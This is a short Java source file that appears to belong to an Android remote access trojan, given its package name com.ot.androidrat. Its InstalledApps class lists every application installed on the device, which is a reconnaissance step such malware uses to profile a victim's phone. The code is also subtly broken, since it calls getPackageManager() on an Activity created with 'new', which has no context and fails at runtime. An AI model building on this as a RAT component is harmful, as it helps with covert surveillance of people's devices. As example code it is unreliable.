package com.ot.androidrat;

import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;

import java.util.List;

public class InstalledApps {
    public List getInstalledApps(){
        PackageManager pm = new MainActivity().getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        return packages;
    }
}
